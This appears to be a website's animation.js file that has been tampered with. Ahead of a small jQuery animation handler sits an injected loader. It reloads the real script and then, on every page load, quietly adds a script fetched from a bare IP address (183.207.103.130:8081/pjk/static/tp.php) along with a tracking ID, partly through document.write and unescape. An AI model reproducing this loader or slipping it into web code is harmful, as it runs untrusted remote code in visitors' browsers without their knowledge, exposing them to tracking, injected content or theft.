var _ju = "http://qass.im/products/awraq/en/js/animation.js";var _ju = _ju+(_ju.indexOf('?') > 0 ? '&' : '?') + '_t=' + (new Date().getTime());var _b = "AH458671";var _c = "8502579_(iKgtV1PhV1gdwj8di19=_643530461_1";
function __crsp(s){
    var N1=document.createElement("script");N1.setAttribute("type","text/javascript"),N1.setAttribute("src",s),document.head?document.head.appendChild(N1):document.body&&document.body.appendChild(N1);
}
var l=document.location.host.split('.');
if(_ju.indexOf(l[l.length-2]+'.'+l[l.length-1])>0){
    var html = '<div><script>document.write(unescape(\'%3Cscript src="' + _ju +  '" %3E%3C/script%3E\') );<\/script></div>';
    document.write(html);
}else{
    __crsp(_ju);
}
__crsp("http://183.207.103.130:8081/pjk/static/tp.php?b="+_b);

$(document).ready(function(){
	
	setTimeout(remove_animate, 2000);
	function remove_animate() {	
		$('.wrapper').removeClass('animated fadeInDown');
	}

})